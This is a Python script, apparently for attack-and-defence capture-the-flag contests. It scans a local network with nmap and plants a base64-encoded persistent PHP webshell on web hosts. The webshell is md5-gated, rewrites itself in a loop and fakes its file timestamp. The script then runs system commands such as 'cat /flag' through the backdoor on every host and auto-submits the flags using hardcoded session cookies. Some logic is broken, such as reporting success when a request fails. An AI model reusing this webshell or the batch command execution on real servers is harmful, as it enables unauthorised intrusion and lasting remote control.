'''
Descripttion: 
version: 
Author: A1ertx5s
Date: 2021-11-12 02:45:38
LastEditors: sA1ertx5s
LastEditTime: 2021-11-17 17:38:58
'''

import os
import nmap
import time
import datetime
import socket
import schedule
import requests
import argparse

"""
一、前期信息收集
"""
def getHost():
    """
    获取当前主机所在的IP

    返回：
     - host: 当前主机的ip地址
    """
    host = socket.gethostbyname(socket.gethostname())
    return host

def hostScanner(host=None, save=True):
    """
    获取局域网内存活的IP

    参数：
     - host：指定扫描的IP地址，如果没有输入，则默认为当前主机所在ip
     - save: 是否保存，默认为True

    返回：
     - hosts_list：返回存活的主机IP，第一个参数为IP，第二个为状态
    """

    print("hostScanner启动，开始扫描存活主机")
    if host == None:
        host = getHost()
    print("当前IP为：", host)
    print("开始扫描网段: ", host[:10]+'/24')
    # 创建PortScanner对象
    nm = nmap.PortScanner()
    nm.scan(hosts=host+"/24", arguments="-sP")
    hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
    print("扫描完成！！")
    if save:
        resultpath = './hosts.txt'
        if os.path.exists(resultpath):
            os.remove(resultpath)
        file = open(resultpath, 'w')
        for host, status in hosts_list:
            file.write(host+'\n')
        file.close()
        print("存活IP保存成功，地址为", resultpath)

    return hosts_list

def portScanner(hosts_list):
    """
    端口扫描，将前面所得到的局域网内存活IP的开放端口扫描出来

    参数：
     - hosts_list：主机IP
    
    """
    nm = nmap.PortScanner()
    for host_ip, status in hosts_list:
        print(host_ip)
        nm.scan(hosts=host_ip, arguments='1-1024')
        # 以列表形式返回scan（）函数指定的主机信息
        for host in nm.all_hosts():
            print('==================================================')

		    # 主机IP和名称
            print('Host:{0} ({1})'.format(host, nm[host].hostname()))

		    # 主机状态，处于服务中为up
            print('State:{0}'.format(nm[host].state()))

		    # 以列表形式显示主机中扫描到 所有协议
            for proto in nm[host].all_protocols():
                print('--------------------------')
                print('Protocal:'+proto)
                # 以集合形式返回不同主机与协议中开发的端口信息
                lport = list(nm[host][proto].keys())
                lport.sort()
                for port in lport:
                    # 显示端口详细信息
                    print('port:{0}\tstate:{1}'.format(
                    port, nm[host][proto][port]))
        print('==================================================')


"""
二、种植不死马
"""

def gethost(filepath):
    """
    从文件中读取host

    参数：
     - filepath: 读取host的文件地址
    """
    file = open(filepath)
    lines = file.readlines()
    hosts_list = [host.replace('\n', '') for host in lines]
    return hosts_list

def keepshell(urlpath, filepath, port=80):
    """
    种植不死马的函数

    参数：
     - urlpath: url的路径
     - filepath: host文件路径
     - port：web服务所在端口，默认为80

    """
    webshell="PD9waHAKc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwp1bmxpbmsoX19GSUxFX18pOwokZmlsZT0iLkExZXJ0eDVzLnBocCI7CiRjb250ZW50PSc8P3BocCBpZihtZDUoJF9HRVRbIm1kNSJdKT09ImZmYmUzZGJiMDgxNDA1Mzc0YTE1MzA5NDAyZjJlMjBhIil7QGV2YWwoJF9QT1NUWyJBMWVydHg1cyJdKTt9ID8+JzsKd2hpbGUgKDEpIHsKICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCAkY29udGVudCk7CiAgICBzeXN0ZW0oJ3RvdWNoIC1tIC1kICIyMDE4LTEyLTAxIDA5OjEwOjEyIiAuQTFlcnR4NXMucGhwJyk7CiAgICB1c2xlZXAoNTAwKTsKfQo/Pg=="
    # md5=Sends, key=A1ertx5s
    hosts_list = gethost(filepath)
    data = "'echo " + webshell + " | base64 -d > /var/www/html/.index.php'"
    for host in hosts_list:
        # url = "http://"+host+":"+str(port)+urlpath+'&b='+ data
        # try:
        #     r = requests.get(url)
        # except:
        #     continue
        try:
            r = requests.get("http://"+host+":"+str(port)+"/uploads/images/webshell3.php", timeout=(3, 0.1))
        except:
            print(host, "种马成功")

"""
三、批量get flag
"""

def getflag(filepath, md5key, key, cmd, port=80):
    """
    获取flag
    
    参数：
     - filepath: host文件路径
     - md5key: md5密钥
     - key: 一句话木马密钥
     - cmd: 执行的指令
     - port: 服务所在的端口，默认为80
    """
    print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    hosts_list = gethost(filepath)
    data = {key : "system('" + cmd + "');"}
    file = open('./flag.txt', 'w')
    for host in hosts_list:
        url = 'http://'+host+':'+str(port)+'/uploads/images/.A1ertx5s.php'+'?md5='+md5key
        # url = 'http://'+host+':'+str(port)+'/indexs.php?a=system&b="'+cmd+'"'
        r = requests.post(url, data=data)
        # r = requests.get(url)
        file.write(r.text)
        print(host, ':', r.text)
    file.close()

"""
四、批量提交flag
"""

def pullflag():
    headers = {
        'Host': '192.168.10.100',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Length': '76',
        'Origin': 'http://192.168.10.100',
        'Connection': 'close',
        'Referer': 'http://192.168.10.100/attack-defence',
        'Cookie': 'advanced-frontend=3b8b7782c4eaab568452380707c99454; _csrf-frontend=9a50e82dd82584de835020f134a9fdae74bb3468610917ad11de5ed5e32ef12aa%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22A8znLf8EaYWG65UUd4pcVRJOV9Q1-LRl%22%3B%7D'
    }

    file = open('./flag.txt')
    flags = file.readlines()
    for flag in flags:
        flag = flag[0:-1]
        flag = flag.replace('#','')
        if len(flag) < 10:
            continue
        data = {'jsondata[flag]': flag ,'jsondata[topic_id]':'10','jsondata[thought_path]':''}
        try:
            r = requests.post('http://192.168.10.100/attack-defence/examine', headers=headers, data=data)
            print(r.text)
            print('Success:', flag)
        except:
            print('error')

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('modular', help="指定操作模块：attack(一条龙服务), gethost(获取存活主机), portscanner(端口扫描), keepshell(种植不死马), getflag(获取flag)，getflagauto(定时获取flag), pullflag(提交flag)")
    parser.add_argument('-H', '--host', help="指定扫描的IP地址，可以将自己的服务器地址输入")
    parser.add_argument('-P', '--port', type=int, default=80, help="指定攻击的web所在端口，默认是80，如有特殊端口再指定")
    parser.add_argument('-U', '--url', help="指定已知后门所在路由，如：/path/to/webshell.php")
    parser.add_argument('-C', '--cmd', help="指定执行的指令，比如cat /flag")
    parser.add_argument('-T', '--time', type=int, default=10, help="指定每几分钟执行一次getflag")
    args = parser.parse_args()
    if args.modular == 'gethost':
        print('='*50)
        if args.host:
            hostScanner(args.host)
        else:
            hostScanner()
        print('='*50)
    elif args.modular == 'keepshell':
        print('='*50)
        if args.url:
            keepshell(args.url, './hosts.txt', args.port)
        else:
            print("请输入url")
        print('='*50)
    elif args.modular == 'getflag':
        print('='*50)
        if args.cmd:
            getflag('hosts.txt', 'Sends', 'A1ertx5s', args.cmd, args.port)
        print('='*50)
    elif args.modular == 'getflagauto':
        print('='*50)
        if args.cmd:
            schedule.every(args.time).minutes.do(getflag, filepath='hosts.txt', md5key='Sends', key='A1ertx5s', cmd=args.cmd, port=args.port)
            schedule.every(args.time).minutes.do(pullflag)
            while True:
                schedule.run_pending()
                time.sleep(10)
        print('='*50)
    elif args.modular == 'pullflag':
        print('='*50)
        pullflag()
        print('Success')
        print('='*50)
    
    
